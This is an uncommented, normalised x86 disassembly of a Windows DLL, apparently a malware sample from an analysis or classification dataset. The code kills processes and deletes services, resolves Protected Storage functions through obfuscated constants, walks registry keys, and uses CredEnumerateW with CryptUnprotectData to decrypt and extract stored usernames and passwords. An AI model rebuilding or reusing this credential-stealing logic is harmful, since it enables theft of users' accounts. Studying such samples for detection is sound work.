jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x24 ] esi
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
lea ecx [ ebp - 0x20 ]
push ecx
push 0x1
push eax
call [ ControlService@IAT ]
jmp r-xdata
push 0x10000
lea ecx [ edi + 0x14 ]
push ecx
push eax
call [ OpenServiceW@IAT ]
mov ebx [ CloseServiceHandle@IAT ]
mov [ ebp - 0x28 ] eax
cmp eax esi
je r-xdata
push [ ebp - 0x28 ]
call [ CloseServiceHandle@IAT ]
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov edi [ ebp - 0x30 ]
imul edi edi 0x21c
add edi 0x218
push edi
call ebx
mov ebx eax
pop ecx
mov [ ebp - 0x2c ] ebx
cmp ebx esi
je r-xdata
push [ ebp - 0x28 ]
call [ CloseServiceHandle@IAT ]
jmp r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
jmp r-xdata
test eax eax
je r-xdata
push eax
call [ DeleteService@IAT ]
mov [ ebp - 0x24 ] 0x8
push edi
push esi
push ebx
call [ memset@IAT ]
mov eax [ ebp - 0x30 ]
imul eax eax 0x21c
add eax 0x218
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x3
mov [ ebx + 0x10 ] esi
mov eax [ ebp - 0x30 ]
add esp 0xc
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x3c ] esi
cmp [ ebp - 0x30 ] esi
jbe r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x24 ] esi
jmp r-xdata
push [ ebp - 0x34 ]
call [ free@IAT ]
pop ecx
jmp r-xdata
mov [ ebp - 0x24 ] esi
jmp r-xdata
mov esi [ ebp - 0x34 ]
add esi 0x8
mov [ ebp - 0x24 ] esi
add ebx 0x116
jmp r-xdata
push [ ebp - 0x34 ]
call ebx
jmp r-xdata
push [ ebp - 0x28 ]
call ebx
jmp r-xdata
mov edi [ ebp - 0x40 ]
jmp r-xdata
mov edi [ wcsncpy@IAT ]
push 0x80
push [ esi - 0x8 ]
lea eax [ ebx - 0xfe ]
push eax
call edi
xor eax eax
mov [ ebx ] ax
push 0x80
push [ esi - 0x4 ]
lea eax [ ebx + 0x2 ]
push eax
call edi
add [ ebp - 0x24 ] 0x24
add esp 0x18
xor eax eax
inc [ ebp - 0x3c ]
mov [ ebx + 0x100 ] ax
mov eax [ ebp - 0x3c ]
push 0x7
lea edi [ ebx + 0x102 ]
pop ecx
[ edi ] [ esi ]
add ebx 0x21c
cmp eax [ ebp - 0x30 ]
jb r-xdata
mov esi [ ebp - 0x24 ]
xor esi esi
sub_1000b2b0
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
xor edi edi
xor ebx ebx
sub eax edi
mov [ ebp - 0x20c ] edi
je r-xdata
mov [ ebp - 0x208 ] edi
mov [ ebp - 0x20c ] edi
dec eax
jne r-xdata
mov eax 0xc00000a0
push edi
push [ ebp - 0x208 ]
push esi
push 0x5
call [ ZwQuerySystemInformation@IAT ]
cmp eax 0xc0000004
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
push [ esi + 0x14 ]
push edi
push 0x1
call [ OpenProcess@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
mov [ ebp - 0x208 ] edi
mov eax esi
cmp esi edi
je r-xdata
add [ ebp - 0x208 ] 0x1000
push [ ebp - 0x208 ]
push [ ebp - 0x20c ]
call [ realloc@IAT ]
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x20c ] esi
cmp esi edi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x20c ]
call sub_10004d09
cmp [ ebp - 0x20c ] edi
push esi
push eax
push [ ebp - 0x20c ]
mov [ ebp - 0x208 ] eax
sete al
movzx eax al
push eax
call sub_1000aefc
mov ebx eax
cmp [ ebp - 0x208 ] edi
je r-xdata
push edi
push ebx
call [ TerminateProcess@IAT ]
test eax eax
je r-xdata
mov ecx [ eax ]
cmp ecx edi
je r-xdata
cmp [ eax + 0x44 ] edi
je r-xdata
push esi
jmp r-xdata
cmp eax edi
jge r-xdata
push [ ebp - 0x208 ]
call sub_10004ad0
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x20c ] edi
jmp r-xdata
mov esi [ ebp - 0x208 ]
imul esi esi 0x188
add esi 0x218
push esi
call [ malloc@IAT ]
mov ebx eax
pop ecx
cmp ebx edi
je r-xdata
add eax ecx
jne r-xdata
inc [ ebp - 0x208 ]
call [ free@IAT ]
pop ecx
push ebx
call [ CloseHandle@IAT ]
push [ ebp - 0x20c ]
push esi
push edi
push ebx
call [ memset@IAT ]
mov eax [ ebp - 0x208 ]
mov [ ebx ] esi
mov [ ebx + 0x10 ] edi
mov edi [ ebp - 0x20c ]
add esp 0xc
mov [ ebx + 0x4 ] 0x2
mov [ ebx + 0x14 ] eax
lea esi [ ebx + 0x116 ]
cmp [ eax + 0x3c ] edi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
push eax
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov [ ebp - 0x208 ] eax
test eax eax
je r-xdata
add edi eax
jne r-xdata
movzx ecx [ edi + 0x38 ]
mov eax 0x80
cmp ax cx
jb r-xdata
push 0xff
lea ecx [ ebp - 0x204 ]
push ecx
push 0x0
push eax
call [ GetModuleFileNameExW@IAT ]
test eax eax
je r-xdata
mov eax [ edi + 0x44 ]
test eax eax
je r-xdata
push eax
push [ edi + 0x3c ]
lea eax [ esi - 0xfe ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
xor eax eax
mov [ esi ] ax
mov eax ecx
movzx ecx [ edi + 0x38 ]
mov eax 0x80
cmp ax cx
jb r-xdata
xor eax eax
mov [ ebp - 0x8 ] ax
push 0x80
lea eax [ ebp - 0x204 ]
push eax
jmp r-xdata
push eax
push [ edi + 0x3c ]
mov eax ecx
lea eax [ esi - 0xfe ]
push eax
call [ wcsncpy@IAT ]
add esp 0xc
push [ ebp - 0x208 ]
xor eax eax
mov [ esi ] ax
call [ CloseHandle@IAT ]
jmp r-xdata
mov eax [ edi + 0x44 ]
mov [ esi + 0x82 ] eax
mov eax [ edi + 0x50 ]
mov [ esi + 0x86 ] eax
push [ edi + 0x44 ]
lea ecx [ esi + 0x2 ]
call sub_10004f32
pop ecx
add esi 0x188
sub_1000b53f
push 0x68
mov eax sub_1000fd4f
call sub_1000fc19
mov eax [ ebp + 0x8 ]
mov esi r--data
xor ebx ebx
push esi
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x58 ] ebx
call [ GetModuleHandleA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
mov esi [ htonl@IAT ]
push 0x5053746f
call esi
push 0x72654372
mov [ ebp - 0x2c ] eax
call esi
push 0x65617465
mov [ ebp - 0x28 ] eax
call esi
push 0x496e7374
mov [ ebp - 0x24 ] eax
call esi
push 0x616e6365
mov [ ebp - 0x20 ] eax
call esi
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x2c ]
push eax
push edi
mov [ ebp - 0x18 ] ebx
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
push esi
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ ebp - 0x58 ]
call sub_1000fc63
retn
push ebx
push ebx
push ebx
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x4 ] ebx
push ecx
mov [ ebp - 0x54 ] ebx
call eax
cmp eax ebx
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x54 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x50 ] ebx
cmp eax ebx
jne r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x50 ]
push edx
push ebx
push ebx
push eax
mov esi eax
call [ ecx + 0x38 ]
cmp eax ebx
jge r-xdata
push 0x80004003
call sub_1000f270
cmp [ ebp - 0x50 ] ebx
jne r-xdata
push r--data
push esi
push eax
call sub_1000f290
mov eax [ ebp - 0x50 ]
mov eax [ eax ]
push ebx
lea ecx [ ebp - 0x3c ]
push ecx
push 0x1
push [ ebp - 0x50 ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ ebp - 0x4 ] bl
mov eax [ ebp - 0x50 ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x64 ] ebx
cmp eax ebx
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x64 ]
push edx
push ebx
lea edx [ ebp - 0x3c ]
push edx
push ebx
push eax
mov edi eax
call [ ecx + 0x3c ]
mov esi eax
cmp esi ebx
jge r-xdata
jne r-xdata
push r--data
push edi
push esi
call sub_1000f290
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x64 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x64 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ecx [ eax ]
push ebx
lea edx [ ebp - 0x4c ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x60 ] ebx
cmp eax ebx
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x60 ]
push edx
push ebx
lea edx [ ebp - 0x4c ]
push edx
lea edx [ ebp - 0x3c ]
push edx
push ebx
push eax
mov esi eax
call [ ecx + 0x54 ]
cmp eax ebx
jge r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x74 ]
imul eax eax 0x128
lea eax [ eax + ecx + 0x20 ]
push r--data
push esi
push eax
call sub_1000f290
mov ecx [ eax ]
push ebx
lea edx [ ebp - 0x68 ]
push edx
push 0x1
push eax
call [ ecx + 0xc ]
test eax eax
jne r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x60 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x54 ]
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x70 ] ebx
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push ebx
push ebx
lea edx [ ebp - 0x70 ]
push edx
lea edx [ ebp - 0x6c ]
push edx
push [ ebp - 0x68 ]
lea edx [ ebp - 0x4c ]
push edx
lea edx [ ebp - 0x3c ]
push edx
push ebx
push eax
mov esi eax
call [ ecx + 0x44 ]
cmp eax ebx
jge r-xdata
cmp [ ebp - 0x58 ] 0x400
jge r-xdata
push r--data
push esi
push eax
call sub_1000f290
jmp r-xdata
mov eax [ ebp - 0x60 ]
cmp eax ebx
je r-xdata
mov edi [ ebp - 0x5c ]
mov eax [ ebp - 0x5c ]
add edi 0xffffffe0
lea esi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edi [ eax - 0x10 ]
lea esi [ ebp - 0x4c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x7f
push [ ebp - 0x68 ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ wcsncpy@IAT ]
mov eax [ ebp - 0x5c ]
xor ecx ecx
mov [ eax + 0xfe ] cx
mov ecx [ ebp - 0x70 ]
mov [ eax + 0x100 ] ecx
mov ecx [ ebp - 0x6c ]
add esp 0xc
inc [ ebp - 0x58 ]
mov [ eax + 0x104 ] ecx
add eax 0x128
jmp r-xdata
mov [ ebp - 0x5c ] eax
sub_1000b7e1
push ebp
mov ebp esp
sub esp 0x45c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x450 ] 0x0
push ebx
push esi
mov esi edx
push edi
push esi
mov edi ecx
mov [ ebp - 0x45c ] esi
call sub_1000b53f
pop ecx
test eax eax
jle r-xdata
push esi
call [ free@IAT ]
pop ecx
call [ CoUninitialize@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x450 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
sub edi 0xffffff80
mov [ ebp - 0x440 ] edi
mov edi [ wcsncpy@IAT ]
add esi 0x124
mov [ ebp - 0x458 ] eax
mov ebx 0x80
add esi 0x128
dec [ ebp - 0x458 ]
jne r-xdata
mov eax [ esi - 0x4 ]
movsx eax [ eax ]
push eax
call [ isprint@IAT ]
pop ecx
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov esi [ ebp - 0x45c ]
push ebx
lea eax [ ebp - 0x1d0 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
push 0x100
lea eax [ ebp - 0x338 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
push 0x100
lea eax [ ebp - 0x438 ]
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
push ebx
lea eax [ ebp - 0x88 ]
push 0x0
push eax
call [ memset@IAT ]
mov eax [ esi - 0x124 ]
add esp 0xc
cmp eax 0x220d5cc1
je r-xdata
lea eax [ ebp - 0x1d0 ]
push r--data
push eax
call [ wcscpy@IAT ]
lea eax [ esi - 0x104 ]
push ebx
push eax
lea eax [ ebp - 0x338 ]
push eax
call edi
add esp 0x14
xor eax eax
mov [ ebp - 0x23a ] ax
lea eax [ ebp - 0x44c ]
push eax
push 0x20019
push 0x0
push r--data
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
cmp eax 0x5e7e8100
je r-xdata
push ebx
lea eax [ esi - 0x104 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call edi
add esp 0xc
push eax
push eax
push eax
push eax
lea ecx [ ebp - 0x43c ]
push ecx
lea ecx [ ebp - 0x238 ]
push ecx
mov [ ebp - 0x454 ] eax
push eax
jmp r-xdata
push r--data
jmp r-xdata
cmp eax 0xb9819c52
je r-xdata
push eax
push [ esi - 0x4 ]
lea eax [ ebp - 0x88 ]
push eax
call [ strncpy@IAT ]
mov [ ebp - 0x9 ] 0x0
add esp 0xc
push 0x7f
pop eax
push [ ebp - 0x44c ]
mov [ ebp - 0x43c ] 0x64
call [ RegEnumKeyExA@IAT ]
cmp eax 0x103
jne r-xdata
lea eax [ ebp - 0x1d0 ]
push eax
call [ wcscpy@IAT ]
push ebx
lea eax [ esi - 0x104 ]
push eax
lea eax [ ebp - 0x338 ]
push eax
call edi
add esp 0x14
xor eax eax
mov [ ebp - 0x23a ] ax
jmp r-xdata
push r--data
cmp eax 0xe161255a
lea eax [ ebp - 0x1d0 ]
je r-xdata
test eax eax
jne r-xdata
push [ ebp - 0x44c ]
call [ RegCloseKey@IAT ]
mov eax [ esi ]
cmp eax 0x7f
jbe r-xdata
push r--data
push eax
call [ wcscpy@IAT ]
push ebx
lea eax [ esi - 0x104 ]
push eax
lea eax [ ebp - 0x338 ]
push eax
call edi
xor eax eax
mov [ ebp - 0x23a ] ax
mov eax [ esi ]
add esp 0x14
test eax eax
je r-xdata
push r--data
push eax
call [ wcscpy@IAT ]
push ebx
lea eax [ esi - 0x104 ]
push eax
lea eax [ ebp - 0x438 ]
push eax
call edi
add esp 0x14
jmp r-xdata
inc [ ebp - 0x454 ]
xor eax eax
push eax
push eax
push eax
push eax
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x238 ]
push eax
push [ ebp - 0x454 ]
mov eax [ ebp - 0x43c ]
mov [ ebp + eax - 0x238 ] 0x0
lea eax [ ebp - 0x444 ]
push eax
push 0x20019
push 0x0
lea eax [ ebp - 0x238 ]
push eax
push [ ebp - 0x44c ]
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push 0x40
lea eax [ ebp - 0x1d0 ]
push eax
mov eax [ ebp - 0x440 ]
add eax 0xffffff80
push eax
call edi
mov eax [ ebp - 0x440 ]
xor ecx ecx
add esp 0xc
mov [ eax - 0x2 ] cx
push 0x100
lea ecx [ ebp - 0x338 ]
push ecx
push eax
call edi
mov eax [ ebp - 0x440 ]
xor ecx ecx
add esp 0xc
mov [ eax + 0x1fe ] cx
push 0x40
lea ecx [ ebp - 0x438 ]
push ecx
add eax 0x200
push eax
call edi
mov eax [ ebp - 0x440 ]
add esp 0xc
xor ecx ecx
push 0x40
mov [ eax + 0x27e ] cx
add eax 0x280
push eax
push 0xffffffff
lea eax [ ebp - 0x88 ]
push eax
push ecx
push 0x1
call [ MultiByteToWideChar@IAT ]
inc [ ebp - 0x450 ]
add [ ebp - 0x440 ] 0x380
cdq
sub eax edx
sar eax 0x1
cmp eax 0x7f
jb r-xdata
xor eax eax
mov [ ebp - 0x33a ] ax
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x150 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
push 0x0
push r--data
push [ ebp - 0x444 ]
mov [ ebp - 0x43c ] 0xc8
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
push eax
push [ esi - 0x4 ]
lea eax [ ebp - 0x438 ]
push eax
call edi
add esp 0xc
push [ esi - 0x4 ]
xor eax eax
mov [ ebp - 0x33a ] ax
call [ wcslen@IAT ]
pop ecx
mov ecx [ esi - 0x4 ]
lea eax [ ecx + eax * 2 + 0x2 ]
lea ecx [ ebp - 0x88 ]
jmp r-xdata
push 0x7f
pop eax
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x150 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
push 0x0
push r--data
push [ ebp - 0x444 ]
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x448 ] 0x1
je r-xdata
cmp [ eax ] 0x0
jne r-xdata
push [ ebp - 0x444 ]
call [ RegCloseKey@IAT ]
lea eax [ esi - 0x104 ]
push eax
lea eax [ ebp - 0x14c ]
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ esi - 0x104 ]
push eax
lea eax [ ebp - 0x14e ]
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x448 ] 0x2
jne r-xdata
mov dl [ eax ]
mov [ ecx ] dl
inc ecx
add eax 0x2
jmp r-xdata
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x150 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
push 0x0
push r--data
lea eax [ esi - 0x104 ]
push eax
lea eax [ ebp - 0x14e ]
push eax
call [ _wcsicmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x43c ]
push eax
lea eax [ ebp - 0x150 ]
push eax
lea eax [ ebp - 0x448 ]
push eax
push 0x0
push r--data
jmp r-xdata
mov eax [ ebp - 0x43c ]
mov [ ebp + eax - 0x150 ] 0x0
push ebx
lea eax [ ebp - 0x150 ]
push eax
lea eax [ esi - 0x104 ]
push eax
call edi
add esp 0xc
xor eax eax
mov [ esi - 0x6 ] ax
push [ ebp - 0x444 ]
mov [ ebp - 0x43c ] 0xc8
call [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
sub_1000bd27
push ebp
mov ebp esp
sub esp 0x384
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor esi esi
push esi
push esi
mov edi ecx
call [ CoInitializeEx@IAT ]
xor eax eax
movsx cx [ eax + r--data ]
shl cx 0x2
mov [ ebp + eax * 2 - 0x158 ] cx
inc eax
cmp eax 0x25
jl r-xdata
lea eax [ ebp - 0x158 ]
mov [ ebp - 0x370 ] eax
lea eax [ ebp - 0x35c ]
push eax
lea eax [ ebp - 0x364 ]
push eax
push esi
push esi
mov [ ebp - 0x374 ] 0x4a
mov [ ebp - 0x360 ] esi
call [ CredEnumerateW@IAT ]
test eax eax
je r-xdata
call [ CoUninitialize@IAT ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x360 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
xor eax eax
mov [ ebp - 0x368 ] eax
cmp [ ebp - 0x364 ] esi
jbe r-xdata
push [ ebp - 0x35c ]
call [ CredFree@IAT ]
mov esi [ wcsncpy@IAT ]
add edi 0x27e
mov eax [ ebp - 0x368 ]
inc eax
mov [ ebp - 0x368 ] eax
cmp eax [ ebp - 0x364 ]
jb r-xdata
push r--data
call [ wcslen@IAT ]
push eax
mov eax [ ebp - 0x35c ]
mov eax [ eax + ebx * 4 ]
push r--data
push [ eax + 0x8 ]
call [ _wcsnicmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
mov ebx eax
mov eax [ ebp - 0x35c ]
mov eax [ eax + ebx * 4 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x35c ]
mov ecx [ eax + ebx * 4 ]
mov ecx [ ecx + 0x1c ]
mov [ ebp - 0x378 ] ecx
mov eax [ eax + ebx * 4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x37c ] eax
lea eax [ ebp - 0x384 ]
push eax
xor eax eax
push eax
push eax
push eax
lea ecx [ ebp - 0x374 ]
push ecx
push eax
lea eax [ ebp - 0x37c ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x380 ]
lea eax [ ebp - 0x358 ]
push r--data
push 0x100
push eax
call [ _snwprintf@IAT ]
lea eax [ ebp - 0x358 ]
push 0x3a
push eax
call [ wcschr@IAT ]
add esp 0x18
mov [ ebp - 0x36c ] eax
push 0x40
test eax eax
je r-xdata
lea eax [ ebp - 0x358 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
call esi
add esp 0xc
xor eax eax
mov [ ebp - 0xa ] ax
mov [ ebp - 0x108 ] ax
xor ecx ecx
mov [ eax ] cx
lea eax [ ebp - 0x358 ]
push eax
lea eax [ ebp - 0x88 ]
push eax
call esi
xor eax eax
mov [ ebp - 0xa ] ax
mov eax [ ebp - 0x36c ]
add eax 0x2
push 0x40
push eax
lea eax [ ebp - 0x108 ]
push eax
call esi
add esp 0x18
xor eax eax
mov [ ebp - 0x8a ] ax
jmp r-xdata
push [ ebp - 0x380 ]
call [ LocalFree@IAT ]
lea eax [ edi - 0x27e ]
push r--data
push eax
call [ wcscpy@IAT ]
push 0x100
lea eax [ ebp - 0x358 ]
push eax
lea eax [ edi - 0x1fe ]
push eax
call esi
xor eax eax
mov [ edi ] ax
push 0x40
lea eax [ ebp - 0x88 ]
push eax
lea eax [ edi + 0x2 ]
push eax
call esi
xor eax eax
mov [ edi + 0x80 ] ax
push 0x40
lea eax [ ebp - 0x108 ]
push eax
lea eax [ edi + 0x82 ]
push eax
call esi
xor eax eax
add esp 0x2c
inc [ ebp - 0x360 ]
mov [ edi + 0x100 ] ax
add edi 0x380
push 0x100
push r--data
call [ wcslen@IAT ]
pop ecx
mov ecx [ ebp - 0x35c ]
mov ecx [ ecx + ebx * 4 ]
mov ecx [ ecx + 0x8 ]
lea eax [ ecx + eax * 2 ]
push eax
lea eax [ ebp - 0x358 ]
push eax
call esi
xor eax eax
add esp 0xc
cmp [ ebp - 0x360 ] 0x64
mov [ ebp - 0x15a ] ax
jae r-xdata
sub_1000bfe8
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
push esi
mov [ edi + 0x4 ] ebx
mov [ edi ] ebx
mov [ ebp - 0x4 ] eax
cmp eax ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
push ebx
push ebx
push 0xffffffff
push [ ebp - 0x4 ]
push ebx
push 0x1
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] r--data
pop esi
mov eax edi
pop ebx
leave
retn
lea eax [ eax + eax + 0x2 ]
push eax
call [ malloc@IAT ]
pop ecx
mov [ edi ] eax
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + ecx + 0x2 ]
push ecx
push ebx
push eax
call [ memset@IAT ]
add esp 0xc
push [ ebp - 0x8 ]
push [ edi ]
push 0xffffffff
push [ ebp - 0x4 ]
push ebx
push 0x1
call esi
sub_1000c057
push esi
mov esi eax
mov eax [ esi ]
push edi
mov edi [ free@IAT ]
test eax eax
je r-xdata
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
push eax
call edi
pop ecx
pop edi
pop esi
retn
push esi
call edi
pop ecx
sub_1000c079
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov eax [ esi + 0x4 ]
push edi
xor edi edi
cmp eax edi
je r-xdata
mov eax [ esi ]
cmp eax edi
jne r-xdata
push eax
call [ free@IAT ]
pop ecx
mov [ esi + 0x4 ] edi
push ebx
mov ebx [ WideCharToMultiByte@IAT ]
push edi
push edi
push edi
push edi
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov [ ebp - 0x4 ] eax
cmp eax edi
je r-xdata
mov eax r--data
mov esi [ esi + 0x4 ]
pop ebx
mov eax esi
cmp esi edi
jne r-xdata
inc eax
push eax
call [ malloc@IAT ]
pop ecx
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
pop edi
pop esi
leave
retn
mov eax r--data
mov ecx [ ebp - 0x4 ]
inc ecx
push ecx
push edi
push eax
call [ memset@IAT ]
mov eax [ esi ]
add esp 0xc
cmp eax edi
jne r-xdata
push edi
push edi
push [ ebp - 0x4 ]
push [ esi + 0x4 ]
push 0xffffffff
push eax
push edi
push 0x1
call ebx
mov eax r--data
sub_1000c108
push ebp
mov ebp esp
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push edi
mov edi r--data
test eax eax
jne r-xdata
push eax
call [ free@IAT ]
and [ esi ] 0x0
pop ecx
push eax
call [ wcslen@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
call [ malloc@IAT ]
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
mov eax edi
lea eax [ ebp + 0x8 ]
call sub_1000c057
mov eax esi
pop edi
pop ebp
retn 0x8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push edi
push eax
call [ wcscpy@IAT ]
pop ecx
pop ecx
mov edi [ ebp + 0x8 ]
sub_1000c167
push ebp
mov ebp esp
push ecx
mov eax [ edi ]
test eax eax
jne r-xdata
push ebx
push esi
mov esi [ wcslen@IAT ]
push eax
call esi
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
pop ecx
test eax eax
jne r-xdata
mov eax r--data
push eax
call esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
pop ecx
test eax eax
jne r-xdata
mov eax r--data
push eax
call esi
add eax ebx
lea eax [ eax + eax + 0x2 ]
push eax
push [ edi ]
call [ realloc@IAT ]
add esp 0xc
pop esi
mov [ edi ] eax
pop ebx
test eax eax
je r-xdata
mov eax r--data
mov eax edi
leave
retn 0x4
mov edx [ ebp - 0x4 ]
xor ecx ecx
mov [ eax + edx * 2 ] cx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
test eax eax
jne r-xdata
push eax
push [ edi ]
call [ wcscat@IAT ]
pop ecx
pop ecx
mov eax r--data
sub_1000c1e9
push ebp
mov ebp esp
and [ esi + 0x4 ] 0x0
push edi
lea edi [ ebx + ebx + 0x4 ]
push edi
push 0x0
call [ realloc@IAT ]
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov edx r--data
pop edi
test eax eax
jne r-xdata
push edi
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
mov ecx [ esi ]
test ecx ecx
jne r-xdata
mov eax edx
mov edx [ ebp + 0xc ]
push ebx
lea eax [ eax + edx * 2 ]
push eax
push ecx
call [ wcsncpy@IAT ]
mov eax [ esi ]
add esp 0xc
xor ecx ecx
mov [ eax + ebx * 2 ] cx
mov eax esi
pop ebp
retn 0x8
mov ecx edx
sub_1000c24c
mov eax [ eax ]
push edi
mov edi eax
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp eax 0x20
je r-xdata
mov edi r--data
add edi 0x2
jmp r-xdata
cmp eax 0x9
jne r-xdata
and [ esi + 0x4 ] 0x0
push edi
call [ wcslen@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
call [ malloc@IAT ]
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
je r-xdata
mov eax esi
pop edi
retn
push edi
push eax
call [ wcscpy@IAT ]
pop ecx
pop ecx
sub_1000c298
push ebp
mov ebp esp
mov eax [ edi ]
push ebx
push esi
mov esi eax
test eax eax
jne r-xdata
push esi
call [ wcslen@IAT ]
pop ecx
test eax eax
je r-xdata
mov esi r--data
mov esi [ ebp + 0x8 ]
push 0x0
push edi
mov ebx eax
call sub_1000c1e9
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
lea ecx [ esi + eax * 2 - 0x2 ]
sub ecx 0x2
dec eax
jne r-xdata
cmp edx 0x9
jne r-xdata
movzx edx [ ecx ]
cmp edx 0x20
je r-xdata
sub_1000c2e2
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
push [ ebp + 0x8 ]
lea esi [ ebp - 0x8 ]
call sub_1000c24c
